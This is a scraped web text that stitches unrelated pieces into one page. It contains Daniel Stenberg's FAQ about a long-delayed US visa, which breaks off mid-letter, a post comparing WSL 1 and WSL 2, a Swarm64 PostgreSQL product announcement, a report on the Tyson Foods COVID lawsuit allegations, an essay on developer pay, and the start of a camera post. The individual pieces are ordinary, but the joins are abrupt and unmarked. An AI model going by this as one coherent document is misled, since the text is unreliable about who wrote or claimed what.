<p>Next we’ll look how we implemented the iPhone app before looking at the python script</p>



<p>But first you can see a video demo of the tool</p>

<p> Time it took for Daniel to get a US visa </p>
<p><span>
 937 days
</span></p><p> Background </p>
<p>
 On June 26th 2017, Daniel was denied to travel to the US - while still having
 a valid ESTA and passport. He was then denied ESTA on April 3, 2018. When
 subsequently applying for a visa instead, there has been no response for over
 two years. (To <i>visit</i>, not to apply for permanent residency.)

</p><p> Q&amp;A </p>
<p>
<a href="#got-it">Visa approved</a>
</p><div>
<p>
 937 days since my application, I have a visa in my passport. Valid for 10 years.
</p><p> As an unexpected bonus, there's also a 30 days "NIE" (National Interest
 Exception) that allows me a single entry to the US during "PP" (Presidential
 Proclamations) - which is restricting travels to the US from the European
 Schengen zone.
</p></div>
<p>
<a href="#parcel">"There's a package being delivered to you"</a>
</p><div>
<p>
 934 days into the process (10:30 November 6, 2020) I received this
 text on my phone, saying there's a parcel sent to me from "the
 Embassy of the United State".
</p><p>
<img src="https://daniel.haxx.se/media/embassy-text.png" width="600">
</p></div>
<p>
<a href="#send-in">Please send in your passport</a>
</p><div>
<p> On October 13, 2020 (910 days in), the embassy emailed me again,
asking me to "Please send in your passport for further processing."
</p><p> On October 16, I mailed it to the embassy.
</p></div>
<p>
<a href="#plans">Updated travel plans please!</a>
</p><div>
<p> On September 22, 2020 (889 days in), the US Embassy emailed me, and I will
quote verbatim from the email below.
</p><pre>Dear Sir,
&nbsp;
Your visa application is still in administrative processing. However, we regret to
inform you that because you have missed your travel plans, we will require updated
travel plans from you. If you intend to proceed with your visa application, we
therefore ask you to kindly send your updated travel plans, including any relevant
supporting documents (such as  an official invitation letter and financial support
letter/other financial supporting documents). Thank you.
</pre>
<p> So I need to provide updated plans and "invitation letters"...
</p><p> It seems reasonable to suspect that the embassy woke up and realized this
 after having being prodded by the <a href="#officials">congressman's
 email</a> a few days ago. The travel plans have been outdated for the last
 800 days or so and they only email to ask this now?
</p><p> On October 2, 220 (898 days in) I responded to the email with an
 invitation letter with an offer to visit my colleagues at wolfSSL in the US
 at two different future dates (one in December 2020, one in March 2021) and
 "All expenses, hotel, airfare, transportation and food will be paid for him".
 Signed by Larry Stefonic, CEO of wolfSSL.
</p></div>
<p>
<a href="#long">Do you know why this takes so long?</a>
</p><div>
<p> No. They've just informed me "someone is working on it" and that it "may
take a long time" but without qualifying what that means. They call it
"administrative processing."
</p><p> I have talked to several persons who've experienced similar situations, and
  I have learned about waiting times up to 20 months until a definite "no". I used
  to think of that as a sort of "worst case" waiting time. Now we know it can
  take longer...
</p></div>
<p>
<a href="#esta">Why don't you just apply for an ESTA?</a>
</p><p>
  I already did and they denied me that. See one of the <a href="#images">images below</a>.
</p>
<p>
Why did they deny you ESTA?
</p><p>
  I don't know as they won't tell. And I also don't know why they can't respond to my visa application.
</p>
<p>
<a href="#working">So, someone is working on it?</a>
</p><p>
  Allegedly, yes. I'm sure that person must be working very hard...
</p>
<p>
<a href="#eventually">Do you think they will grant you a visa eventually?</a>
</p><div>
<p>
  No. I have been in contact with many people who have been in similar
  situations such as this, as well as many people who have applied for visas
  for very complicated matters, and it is basically unheard of that it would
  take this long time and still end up with a positive response in the end.
</p><p>
  Someone emailed me and explained how they got their visa approved after 10
  months waiting - so it obviously <i>can</i> happen after a fairly
  long time!
</p></div>
<p>
<a name="#arab">Did you travel to any arab countries, middle-east, North Korea, Sudan, Iran or Iraq?</a>
</p><p>
 No.
</p>
<p>
<a name="#ever">Did you ever visit the US?</a>
</p><div>
<p> Yes, I have visted the US around a dozen times over a time period of almost
 twenty years. I have applied and gotten ESTA permissions several times. I have
 many friends living and working in the US.
</p><p> My latest visit to the US was in December 2016 - using the same ESTA and
 passport I subsequently wanted to use in the summer of 2017 when I was first
 denied travelling to the US.
</p></div>
<p>
<a href="#blocked">How many trips have this blocked you from taking so far?</a>
</p><div>
<p> I have been invited personally to several meetings in the US that I couldn't
 attend. (excluding IETF, HTTPbis or QUIC meetings)
</p><ol>
<li> San Francisco June 2017. Mozilla All Hands.
</li><li> San Francisco June 2018. Mozilla All hands.
</li><li> San Francisco October 2018. Conference speaking engagement.
</li><li> Orlando, Florida December 2018. Mozilla All hands.
</li><li> Portland, Oregon January 2019. Conference speaking engagement.
</li><li> California, March 2019. Conference speaking engagement.
</li><li> Summer of 2019. Wedding.
</li></ol>
</div>
<p>
<a href="#employer">Can't your employer help you?</a>
</p><p> We've already tried all available ways to get information or otherwise
bring this effort forward. To no avail.
</p>
<p>
<a href="#Mozilla">Will Mozilla move more meetings outside of the US?</a>
</p><p> Yes. Several of the coming All hands are now planned and scheduled to
happen outside of the US, for example in Canada and Germany. But I will not be
there to experience them since I quit Mozilla in December 2018.
</p>
<p>
Will your visa situation change when you've quit Mozilla?
</p><p> Unfortunately, there is no reason to suspect or hope so.
</p>
<p>
<a href="#lost">Maybe they lost your application?</a>
</p><div>
<p> I emailed them in July 2019 just to make sure they just hadn't
 forgot about my case or similar over the past year, and I received their
 reply on August 1st 2019. The response said "I have forwarded your email to
 my supervisor to highlight the problem."  - but then nothing more came.
</p><p> I emailed them again on January 28, 2020.<br>
<img src="https://daniel.haxx.se/media/651-days-email.png">
</p><p>
 They responded very politely:
 </p><pre>Dear Sir,
&nbsp;
All applications are processed in the most expeditious manner
possible. While we understand your frustration, we are required to follow
immigration law regarding visa issuances. This process cannot be expedited or
circumvented. Rest assured that we will contact you as soon as the
administrative processing is concluded.
</pre>
</div>
<p>
<a href="#likely">What do you think is the most likely explanation for this treatment?</a>
</p><div>
<p> I think one of the likelier explantions is that someone somewhere has
 found my name and my code used in some evil or malicious manner and drawn the
 wrong conclusions about how my code ended up there or how I could've been
 involved. Like for example in some malware, virus or other attack software. I
 make tools and code available for free and openly and sometimes those are
 unfortunately used in ways I don't condone.
</p><p> Since they won't tell me why, basically all theories are equally likely.
 We just won't know.
</p></div>
<p>
Any other plausible explanations?
</p><div>
<p> People have mentioned my domain name <b>haxx.se</b> or suggested it is
because I have referred to myself as "a hacker" at times. I find that unlikely
since I used the domain and used the term for decades before this.
</p><p> Others have offered the explanation that the immigration authorities
might've decided that I violated the ESTA rules in a previous visit. I can of
course not know what they think, but I have not violated those rules.
</p></div>
<p>
<a href="#crime">Convicted of a crime?</a>
</p><p>
No, I have never been convicted of a crime in Sweden and not anywhere
else. Not even charged. Nor have I ever been involved in a lawsuit of any
kind.
</p>
<p>
<a href="#license">Can you change the curl license?</a>
</p><div><p>
Lots of people suggest this, most probably in jest, but let me be perfectly
clear: no I won't change the curl license.
</p><ol>
 <li> excluding a specific user would make a license to not be open source anymore
 </li><li> curl has many more copyrights than mine, it would be hard
 </li><li> curl is bigger than me personally, I wouldn't do it anyway
</li></ol>
</div>
<p>
<a href="#covid">But Covid-19?</a>
</p><p>
During the Corona pandemic (starting in spring 2020), the US has closed its
borders for a lot of more people who otherwise would have been allowed
entry. I suspect the visa processing has slowed down during this period since
people can't go there anyway. But I have not been notified about anything and
I still expect to get a rejection at some point. Pandemic or not.
</p>
<p>
<a href="#officials">Have you contacted any US officials?</a>
</p><div><p>
A US citizen friend of mine sent the following text in an email to the
U.S. Congressman Gerry Connolly on September 3, 2020.
</p><pre>Dear Representative Gerry Connolly:
&nbsp;
Could you please help my friend Daniel Stenberg *finally* gain permission to
travel to the US? He has been denied permission to travel to the US for years,
yet there is no cause for it.
&nbsp;
On June 26, 2017, Mr. Stenberg was denied to travel to the US, even though he
had a valid ESTA and passport. He was then denied ESTA on April 3, 2018. He
then applied for a visa in April 2018, and has *still* not heard anything.
&nbsp;
This is especially galling because is a widely-known leader in the computer
community. He developed and maintains the "curl" program, a program used
worldwide by many software developers and computer system administrators. In
October 2017 he won the "Polhem prize" for his work on curl; in that ceremony
the Swedish king personally handed Daniel a gold medal. In February 2019 he
joined wolfSSL, an American company (he's their only Swedish hire), and yet
he's still not allowed to travel to the US.
&nbsp;
Perhaps there is a confusion about the word "hacker". In the computer
community, a "hacker" is NOT someone who breaks into computers, a hacker
is "a person who delights in having an intimate understanding of the
internal workings of a system, computers and computer networks in
particular."  ( IETF RFC 1983, https://tools.ietf.org/html/rfc1983).

Mr. Stenberg does *not* break into computers without authorization.
&nbsp;
At the least, the State Department should have asked questions instead of
reflexively denying entry to a world leader in the computer industry.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
              
              <article><p>If you have followed Windows 10 at all during the last few years, you know that the <strong>Windows Subsystem for Linux</strong>, or <strong>WSL</strong> for short, is <em>the</em> hot topic among developers. You can finally run your Linux tooling on Windows as a first class citizen, which means you no longer have to learn PowerShell or, god forbid, suffer through the ancient <code>CMD.EXE</code> console.</p>
<p>Unfortunately, not everything is as rosy as it sounds. I now have to do development <em>on</em> Windows <em>for</em> Windows as part of my new role within Azure… and the fact that WSL continues to be separate from the native Windows environment shows. Even though I was quite hopeful, I cannot use WSL as my daily driver because I need to interact with “native” Windows tooling.</p>
<p>I believe things needn’t be this way, but with the recent push for WSL 2, I think that the potential of an alternate world is now gone. But what do I mean with this? For that, we must first understand the differences between WSL 1 and WSL 2 and how the push for WSL 2 may shut some interesting paths.</p>
<p><strong>DISCLAIMER:</strong> I have zero insight on what’s going on within the WSL team or what their future plans are. This is purely my personal opinion based on what I have experienced as a user.</p>

<p>Let’s first take a look at WSL 1, and for that, we must look at what’s in the awkward name. Why was this feature named Windows subsystem… <em>for</em> Linux? Isn’t that backwards? This is not a subsystem in Linux to do anything Windows-related; it’s the other way around!</p>
<p>Well… you see, the name is technically correct when considering the design of the Windows NT kernel. From the <a href="https://en.wikipedia.org/wiki/Architecture_of_Windows_NT">Architecture of Windows NT</a> page in the Wikipedia, we find (emphasis mine):</p>
<blockquote>
<p>User mode in Windows NT is made of subsystems capable of passing I/O requests to the appropriate kernel mode device drivers by using the I/O manager. <strong>The user mode layer of Windows NT is made up of the “Environment subsystems”, which run applications written for many different types of operating systems</strong>, and the “Integral subsystem”, which operates system-specific functions on behalf of environment subsystems. The kernel mode stops user mode services and applications from accessing critical areas of the operating system that they should not have access to.</p>
</blockquote>
<p>Windows NT was designed from the ground up to support running processes from a multitude of operating systems, and Win32 was “just” one of those environment subsystems. With these solid foundations, WSL 1 supplies a new environment subsystem, the Linux subsystem, to run Linux binaries atop the Windows NT kernel. Both the Win32 and Linux environment subsystems share the common integral subsystem.</p>
<p>Mumble jumbo. What does any of that actually mean?</p>
<p>Different system call “front-ends”—that’s what it means. A user-space process is a collection of binary instructions that the processor executes uninterruptedly (leaving interrupts aside). The operating system’s kernel is unaware of what the process is doing until the process issues a system call: at that point, the kernel regains control to perform an operation on behalf of the user, which can be something like reading a file or pausing for a few seconds.</p>
<p>The way a process issues system calls, and the semantics of those system calls, are specific to the operating system. For example, on old x86: opening a file on Win32 is system call number <code>17h</code> invoked via <code>INT 2Eh</code> whereas opening a file on Linux is system call number <code>5h</code> invoked via <code>INT 80h</code>.</p>
<p>But… conceptually, opening a file is opening a file, right? The fact that the system call numbers or the software interrupt numbers are different among them is not particularly interesting. And hereby lies the key design aspect of WSL 1: the Linux subsystem in the NT kernel is, simply put, an implementation of Linux’s system call layer in front of the NT kernel. These system calls later delegate to NT primitives, <em>not</em> Win32 calls. Which is important to repeat: there is no translation from Linux to Win32 system calls.</p>
<p>This is a feat of engineering considering how generally good support for Linux apps got to be under WSL 1 and the many ways in which NT internally differs from Unix, <code>fork+exec</code> being the eternal archenemy.</p>
<p>The true beauty of this design is that there is a single kernel running on the machine, and this kernel has a holistic view of all the processes beneath it. The kernel knows everything about the Win32 <em>and</em> Linux processes. And these processes all interact with unified resources, such a single networking stack, a single memory manager, and a single process scheduler.</p>

<p>If WSL 1 is so cool, then why does WSL 2 exist? Two reasons:</p>
<ul>
<li>WSL 1 has to, essentially, implement all of Linux’s kernel ABI, “bit by bit”. If there is a bug in that interface, the WSL 1 has to replicate it. And if there is a feature that is difficult to represent within the NT kernel, either the feature cannot be implemented or it needs extra kernel logic (and thus becomes slower).</li>
<li>Linux subsystem in WSL 1 has to abide by any “limitations” and inherent differences that exist between the NT kernel and the traditional Unix design. The most obvious one is the NTFS file system and its semantics, and how these differences harm performance of Linux binaries. Poor file system performance seems to be a common complaint in WSL 1.</li>
</ul>
<p>WSL 2 “throws away” all of the Linux subsystem parts of the name and replaces everything with a full-blown (but very well-hidden and fast) virtual machine. The virtual machine then runs a proper Linux kernel, a proper Linux file system, and a proper Linux networking stack within it.</p>
<p>What this means is that the beauty of the WSL 1 design is gone: the Windows NT kernel doesn’t get to see anything that happens within the Linux world any more. All it knows is that there is a big black box that does “stuff” inside, and all it gets to see are the <code>VMENTER</code> and <code>VMEXIT</code> hook points for virtual machines and block-level read/write requests on a virtual disk. The NT kernel is now unaware of Linux processes and file accesses. Similarly, the Linux kernel is unaware of anything in NT land.</p>
<p>You can read about some more differences in the <a href="https://docs.microsoft.com/en-us/windows/wsl/compare-versions">official documentation</a>.</p>

<p>From the user’s point of view, WSL 2 feels strictly better: Linux apps now run much, much faster because they are not subject to awkward Linux system call “emulation” within the NT kernel. If using NTFS with Linux semantics is difficult, that’s no problem because the Linux environment now uses ext4 on a virtual disk. And support for Linux apps can be much more complete, because, well, WSL 2 <em>is</em> Linux: if you want FUSE, to name something, you got it.</p>
<p>But this comes at the cost <em>of what WSL could have been</em>:</p>
<ul>
<li>Can you imagine how cool it would be if you could type <code>ps</code> or <code>top</code> within a WSL session and see Linux <em>and</em> Windows processes side-by-side, able to mutate their state with <code>kill</code>?</li>
<li>Can you imagine how cool it would be to manipulate Windows services from the WSL session?</li>
<li>Can you imagine how cool it would be if you could use <code>ifconfig</code> (wait, is that <code>ip</code>? 🙄) within a WSL session to inspect and modify the machine’s network interfaces?</li>
<li>Essentially, can you imagine doing all of your Windows system administration tasks from within WSL?</li>
</ul>
<p>Although this never existed, I can well imagine such a world… and it’s one that <em>only the WSL 1 design can provide</em>. And the reason I can imagine this is because macOS gives you this model (albeit cheating because macOS is essentially Unix).</p>
<p>Which is what brings me to my frustration: even though I could install WSL on my development machine for Azure, there is nothing I can use it for. I still have to interact with the system via <code>CMD.EXE</code> because I have to deal with Windows-native processes and resources, and because the tooling I have to deal with is Windows-only.</p>
<p>The FAQ for WSL 2 claims that <a href="https://docs.microsoft.com/en-us/windows/wsl/wsl2-faq#what-will-happen-to-wsl-1-will-it-be-abandoned">WSL 1 will not be abandoned</a>, and if we abide by Microsoft’s backwards-compatibility guarantee, that may be true. But keeping WSL 1 running is a monumental effort due to the need to keep up with Linux changes. Regardless, I hope that this is the case and that WSL 1 continues to exist. Who knows, maybe the reason WSL 1 stays behind is to pursue this magical world I’m describing? 🤔</p>

<p>I can’t finish this post without talking about the various BSDs. The BSDs, always trailing behind Linux and other commercial operating systems, have had binary-level compatibility for ages. The earliest I can find is Linux compatibility in the NetBSD kernel back in 1995. That’s 25 years ago, and 21 before WSL 1’s first debut.</p>
<p>And, heck, this isn’t limited to Linux. NetBSD has had support to emulate <em>various</em> different operating systems throughout the years. SVR4 support appeared in 1994 and, for a brief stint, <a href="https://man.netbsd.org/NetBSD-5.0/compat_pecoff.8">NetBSD even had support for… 🥁… PE/COFF binaries</a>—that’s right, Win32 binaries. So, in a way, NetBSD implemented the WSL 1 model in reverse: it let you run Win32 binaries atop the NetBSD kernel back in 2002.</p>

<p>With today’s release of <a href="https://swarm64.com/swarm64-da/">Swarm64 DA 5.0</a>, we bring you even faster, easier PostgreSQL query acceleration. Swarm64 DA 5.0 gives your open source PostgreSQL database the speed to do more: handle more data, more users, and more query complexity.</p>



<p>The new goodies in Swarm64 DA 5.0 include the following:</p>



<ul><li><strong><a href="https://swarm64.com/post/postgresql-columnstore-index-intro/">Compressed columnstore indexing</a></strong>, which transparently caches your PostgreSQL tables in a compressed column-oriented format. Queries that benefit from column-oriented access will automatically retrieve your data via the index for dramatic speedups and without having to sacrifice relational ACID properties.<br>&nbsp;</li><li><strong>Faster sequential scans</strong> than the default PostgreSQL implementation, these are just faster without any effort or changes on your part.<br>&nbsp;</li><li><strong>Automatic analysis of tables</strong> to avoid unexpected slow queries because someone forgot to ANALYZE a table.<br>&nbsp;</li><li><strong>PostgreSQL 12 support</strong> is certified, so you can now use the Swarm64 DA extension to accelerate PostgreSQL 12.x or PostgreSQL 11.x databases.<br>&nbsp;</li><li><strong>Faster DISTINCT statements</strong> – we’ve extended <a href="https://swarm64.com/post/increase-postgresql-parallelism/">Swarm64 DA parallel processing</a> extensions to now also speed up queries with DISTINCT statements.<br>&nbsp;</li></ul>



<h3>Columnar storage made easier (without foreign tables) </h3>



<p>Columnar storage is a proven way to speed up database queries by reducing I/O. Earlier versions of Swarm64 DA and other PostgreSQL acceleration extensions implement columnar storage via the PostgreSQL foreign tables interface. The foreign table approach requires you to migrate or replicate your data from PostgreSQL base tables into the column-oriented foreign tables.</p>



<p>Columnstore indexes in Swarm64 DA 5.0 provide the query acceleration benefits of columnar storage transparently, without requiring you to migrate or duplicate data into foreign tables. It’s easy – <a href="https://swarm64.com/get-swarm/">just get Swarm64 DA 5.0</a>, install it into your PostgreSQL 11 or 12 server, define a columnstore index, and you should see faster query performance.</p>



<h3>Get started with Swarm64 DA 5.0 – development licenses are free</h3>



<p>Curious about whether Swarm64 DA will speed up your PostgreSQL queries? Here’s how to learn more and get started:</p>



<ul><li>Read the <a href="https://swarm64.com/tech-overview-wp/">Swarm64 DA 5.0 technical overview</a></li><li>Read the <a href="https://swarm64.com/docs/">Swarm64 DA 5.0 product docs</a></li><li>Get a <a href="https://swarm64.com/get-swarm/"><strong>free Swarm64 DA 5.0</strong> development license</a></li></ul>



<p>We hope to hear from you; we love feedback on your Swarm64 DA experience. As always, <a href="https://swarm64.com/newsletter/">stay tuned for more news</a>. Same swarm-time, same swarm-channel.</p>

        <p>A wrongful death lawsuit tied to COVID-19 infections in a Waterloo pork processing plant alleges that during the initial stages of the pandemic, Tyson Foods ordered employees to report for work while supervisors privately wagered money on the number of workers who would be sickened by the deadly virus.</p>
<p>Earlier this year, the family of the late Isidro Fernandez sued the meatpacking company, alleging Fernandez was exposed to the coronavirus at the Waterloo plant where he worked. The lawsuit alleges Tyson Foods is guilty of a “willful and wanton disregard for workplace safety.”</p>
<p>In a written statement issued Thursday afternoon, Tyson Foods’ president and chief executive officer, Dean Banks, said: “We are extremely upset about the accusations involving some of the leadership at our Waterloo plant. Tyson Foods is a family company with 139,000 team members and these allegations do not represent who we are, or our core values and team behaviors. We expect every team member at Tyson Foods to operate with the utmost integrity and care in everything we do.</p>
<p>“We have suspended, without pay, the individuals allegedly involved and have retained the law firm Covington &amp; Burling LLP to conduct an independent investigation led by former Attorney General Eric Holder. If these claims are confirmed, we’ll take all measures necessary to root out and remove this disturbing behavior from our company.</p>
<p>“Our top priority is and remains the health and safety of our team members.”</p>
<p>Fernandez, who died on April 20, was one of at least five Waterloo plant employees who died of the virus. According to the Black Hawk County Health Department, more than 1,000 workers at the plant — over a third of the facility’s workforce — contracted the virus.</p>
<p>The lawsuit alleges that despite the uncontrolled spread of the virus at the plant, Tyson required its employees to work long hours in cramped conditions without providing the appropriate personal protective equipment and without ensuring workplace-safety measures were followed.</p>
<p>The lawsuit was recently amended and includes a number of new allegations against the company and plant officials. Among them:</p>
<ul>
<li>In mid-April, around the time Black Hawk County Sherriff Tony Thompson visited the plant and reported the working conditions there “shook [him] to the core,” plant manager Tom Hart organized a cash-buy-in, winner-take-all, betting pool for supervisors and managers to wager how many plant employees would test positive for COVID-19.</li>
<li>John Casey, an upper-level manager at the plant, is alleged to have explicitly directed supervisors to ignore symptoms of COVID-19, telling them to show up to work even if they were exhibiting symptoms of the virus. Casey reportedly referred to COVID-19 as the “glorified flu” and told workers not to worry about it because “it’s not a big deal” and “everyone is going to get it.” On one occasion, Casey intercepted a sick supervisor who was on his way to be tested and ordered him to get back to work, saying, “We all have symptoms — you have a job to do.” After one employee vomited on the production line, managers reportedly allowed the man to continue working and then return to work the next day.</li>
<li>In late March or early April, as the pandemic spread across Iowa, managers at the Waterloo plant reportedly began avoiding the plant floor for fear of contracting the virus. As a result, they increasingly delegated managerial authority and responsibilities to low-level supervisors who had no management training or experience. The supervisors did not require truck drivers and subcontractors to have their temperatures checked before entering the plant.</li>
<li>In March and April, plant supervisors falsely denied the existence of any confirmed cases or positive tests for COVID-19 within the plant, and allegedly told workers they had a responsibility to keep working to ensure Americans didn’t go hungry as the result of a shutdown.</li>
<li>Tyson paid out $500 “thank you bonuses” to employees who turned up for every scheduled shift for three months — a policy decision that allegedly incentivized sick workers to continue reporting for work.</li>
<li>Tyson executives allegedly lobbied Iowa Gov. Kim Reynolds for COVID-19 liability protections that would shield the company from lawsuits, and successfully lobbied the governor to declare that only the state government, not local governments, had the authority to close businesses in response to the pandemic.</li>
</ul>
<p>While Tyson has yet to file a formal response to the new allegations, it has said in previous court filings that it “vigorously disputes” the plaintiffs’ claims and has “invested millions of dollars to provide employees with safety and risk-mitigation equipment.”</p>
<p>The lawsuit claims that while Tyson has repeatedly claimed that its operations needed to remain open to feed America, the company increased its exports to China by 600% during the first quarter of 2020.</p>
<p>The lawsuit is seeking unspecified damages for fraudulent misrepresentation and gross negligence.</p>
<p>The case was initially filed in state court, claiming violations of Iowa law. At Tyson’s request, the case was moved to federal court, with the company claiming it had remained open during the pandemic “at the direction of a federal officer” — President Donald Trump, who, on April 28, invoked his authority under the <a href="https://iowacapitaldispatch.com/2020/05/04/trumps-critics-warn-his-order-to-keep-meat-plants-open-imperils-workers/">Defense Production Act</a> and ordered meat and poultry processing companies to continue operating.</p>
<p>The nonprofit organization Public Citizen has filed an amicus brief in the case, supporting the Fernandez family’s efforts to remand the action back to state court. In its brief, Public Citizen has said that neither the Defense Production Act nor the executive order signed by President Trump had “directed” Tyson to do anything.</p>
<p>The Waterloo facility is Tyson’s largest pork plant in the United States. The facility employs approximately 2,800 workers who process approximately 19,500 hogs per day.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
								<p>Over the last few years I've randomly run into articles and/or posts (<a href="https://danluu.com/bimodal-compensation/">example</a>, <a href="https://news.ycombinator.com/item?id=21177617">example</a>, <a href="https://techcrunch.com/2012/10/27/write-code-get-paid/">example</a>, <a href="https://www.reddit.com/r/cscareerquestions/comments/4yy8mm/does_anyone_else_feel_guilty_that_youre_overpaid/">example</a>, <a href="https://www.jefftk.com/p/programmers-should-plan-for-lower-pay">and others</a>) that assert definitively that software developers/ engineers are paid too much for the work that they do. The "TLDR;" is that the jobs are considerably easier than many technical jobs (Doctor, Electrical Engineer, Lawyer, etc), and often so is the training, so it seems almost unfair that software engineers are paid the way they are. <em>Especially</em> considering that many software jobs are working on seemingly trivial details such as optimizing buttons or forms. </p>
<p>In general, I've held conflicting opinions about this thesis. On the one hand if you're getting paid $250K/year to update the css for a button yeah maybe the pay is a little high (seriously though who leverages their people that way?)... but on the other hand some software engineers are up there with the greatest minds on the planet right now and they probably aren't capturing a fair amount of the value they are generating for the businesses that they are working for. </p>
<p>The latter point of the two made me wonder: </p>
<p><strong>What if developers are actually underpaid?</strong></p>
<p>While it may seem a little odd to question if individuals making 2X-8X the average US salary are being underpaid I think there's actually a reasonable argument to be made. For starters, there tend to be lots of theories around developer pay that focus on labor market efficiency (danluu identifies a number of theories in <a href="https://danluu.com/bimodal-compensation/">"Is dev compensation bimodal"</a>). </p>
<p>Aspects such as: the limited supply of developers or increased demand as the technology sector continues to grow (i.e. <a href="https://a16z.com/2011/08/20/why-software-is-eating-the-world/">"software is eating the world"</a>). Another theory is that software engineering salaries can be high because certain individuals are actually just more productive (i.e. <em>the mythical "10X developer"</em>).  This situation creates an "anchoring" effect to these over-productive individuals which raises salaries as companies fight for talent ( dev salaries are bimodal comes from). There is yet another theory that Software Companies are just worth more and so the people that know how to build them are therefore worth more. </p>
<p>Personally, I find many of these theories can provide some explanation, but I think the macro economic environment is a better explanation. </p>
<h2 id="the-us-loves-venture-captial">The US loves Venture Captial</h2>
<p>Over the last 30 years the number and size of US Venture Capital investments has increased dramatically. In 1991 $3.4 billion in venture capital was invested by US venture funds (ref: SBA Trends in Venture Capital Funding ~1997)... in 2019 there was $136.5 Billion invested. Put another way: "there's a shit load of money in the system" </p>
<p>[Note: I am very aware that not all companies are Venture Capital backed. I am focusing on Venture Capital backed companies because they are the "rising tide that lifts all boats"... meaning other companies have to compete with VC backed companies for the same employee talent pool. If you want a pretty solid explanation on how Venture Capital works read <a href="http://reactionwheel.net/2019/01/why-do-vcs-insist-on-only-investing-in-high-risk-high-return-companies.html">this article</a>]</p>
<p>The reason that there is a shit load of money in the system is because technology companies, and more specifically, software companies have had great return on investment for the last 30 years. Sorry did I say great? I meant mind-blowing returns (<a href="https://www.sequoiafund.com/Performance">example</a>). How do they get returns like that? </p>
<p><strong>Simple. They only invest in high-growth, high-return businesses (like software).</strong> </p>
<p>To restate- there's more venture money than ever being invested in (software) companies, with the sole condition that they grow like crazy or die (e.g. the Gumroad story is <a href="https://sahillavingia.com/reflecting">very illuminating</a>). This state of affairs has influenced the developer labor market by raising developer salaries for those with experience and consequently making it more difficult to break into the industry which furthers the developer "shortage". </p>
<p>... but is there method to the madness?</p>
<p><em>Let's say you're a founder (software) and per your deal with the VC you have to grow fast. To do that you have to build your product fast, which means you need experienced people to build it (because you don't have time to train new people). You go out and recruit looking for talented engineers, but everyone already has a job. Not just that, but they all have good jobs because this VC cash has been flying around for 30 years already. So you finally find someone, and they say they're only willing to come over to a high-risk startup for an extra $30K above market comp for their skill level. Well you look at your situation, you have tons of money but no time... your answer is almost certainly: "fuck it... hire them."</em></p>
<p>...And this is the state of the industry. </p>
<p>Hell, only ~25% of US STEM graduates even work in STEM jobs (<a href="https://www.vox.com/2014/7/11/5888407/even-if-you-have-a-stem-degree-you-probably-dont-have-a-stem-job">link</a>) - no doubt at least a few of them would be smart enough to be retrained to do software engineering. </p>
<p>Here's the thing though, we don't need more STEM people or more programmers... we need more EXPERIENCED programmers because our industry doesn't have time to train new people. So long as there are enough over-sized returns going back to venture capitalists, software developer salaries should continue to go up.</p>
<p>To some extent developer salaries are influenced by the fact that:</p>
<ol>
<li>We don't have enough <em>experienced</em> people building software to meet the demand</li>
<li>Software is eating the world and/or more software is still needed to be built</li>
<li>Experienced engineers are actually more productive than people manually doing it or multiple junior engineers </li>
<li>Software companies are worth more (and they return more)</li>
</ol>
<p>... but as true as these points are, $140 billion is being spent basically telling founders to ignore the "rounding error" on compensation when hiring an engineer and get building your business. </p>
<h2 id="which-brings-me-back-to-my-main-point">Which brings me back to my main point...</h2>
<p><em>Assuming you don't completely disagree with the aforementioned state of the industry (I totally get it if you don't agree).</em> </p>
<ol>
<li><strong>Venture Capitalists</strong> need <strong>software companies</strong> to get their returns. </li>
<li><strong>Software companies</strong> aren't software companies without <strong>software</strong> </li>
<li>You can't have <strong>software</strong> with out <strong>software engineers</strong>. </li>
</ol>
<h3 id="so-are-software-engineers-being-underpaid">So are software engineers being underpaid?</h3>
<p>Yes, or maybe. </p>
<p>Venture capitalist returns have been fairly consistent and Software Company founders have enjoyed an asymmetric risk/reward payout when they succeed... it feels like labor is missing out on their chunk of the pie when considering their leverage and the actual work being performed.</p>
<p>Now, I totally get that there is a labor market and that the returns for an invididual startup could be hard to predict... but I think we also need to be realistic that many of these businesses are simple conversions of analog businesses into digital businesses. It is reasonable to believe that the market could actually bare higher developer salaries as a whole if employers thought that they were recieving adequate value for their money. And if the market can tolerate it why then wouldn't we expect the labor market to react in turn?</p>
<p>I'll start by saying <strong>I don't know the answer</strong> (<em>not to mention that would be a whole other article on its own</em>), but my guess is that the labor market is just inefficient - which is something that software engineers could possibly take advantage of. I think we all know (anecdotally) the industry is really bad at evaluating developer productivity (the way project estimation is conducted should be all the evidence that you need).  The industry is also really (<em>really</em>) bad at interviewing and evaluating talent opportunities. Things could be confounded further because engineering culture doesn't value soft skills (such as negotiation) nearly as much as technical skills. This arguably causes engineers to "leave money on the table"... by not maximizing their compensation opportunity. </p>
<h2 id="larger-trends">Larger Trends</h2>
<p>The last thing I want to add is that VC related macro economic trends probably aren't the only thing making us <strong><em>FEEL</em></strong> like engineering compensation is a bit high. A missing asterisk with all these discussions is that US hasn't seen any noticable wage growth for what, 4 decades? Compare that to a 75% increase in entry level wages at the larger tech firms over the last ten years (~$80K in 2010 to ~$140K in 2020)... yea things are going to feel a little off. If wages across the country were up 40% like we experienced between 1947 and 1960 I feel like the narrative would be different. Other historical periods that compare well to the "information age" saw wages grow considerably (<a href="https://www.investopedia.com/ask/answers/032715/what-impact-does-industrialization-have-wages.asp">the industrial revolution</a>, <a href="https://ideas.repec.org/p/tor/tecipa/munro-04-04.html">post-plague europe</a>, post-WW2, etc.), so why is this transformational period different? I don't know but we certainly are feeling it more.</p>
<h2 id="closing">Closing</h2>
<p>Obviously this is an essay not a research study, but if you are going to take anything from this: </p>
<p>I think it's reasonable to assert software engineers are actually commanding reasonable wages that probably seem inflated more than they actually are inflated. Similarly, I would guess that the industry could benefit from building a better understanding of developer productivity/ how to train engineers rather than just throwing money at the problem... which would probably benefit a lot of engineers too. Chances are they are probably worth more money than they are currently being paid but have no way to know it.</p>

			<p>I’ve been looking out for a cheap Hasselblad XPan for a couple of years; a camera discontinued in 2006<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> and currently selling, second hand, for about double its original retail price. I’ve already had one for a while, but it’s showing signs of impending failure: the shutter will seize up when I take it out on the slopes here, something that didn’t used to happen, and when it <em>is</em> working the shutter sounds rather squeaky. I’ve also dropped it a couple of times, cracking the viewfinder in the process. But these things happen, and parts can be replaced.</p>

<p><img width="625px" src="https://leejo.github.io/projects/alpine_panoramics/17_mont_blanc_dents.jpg"></p>

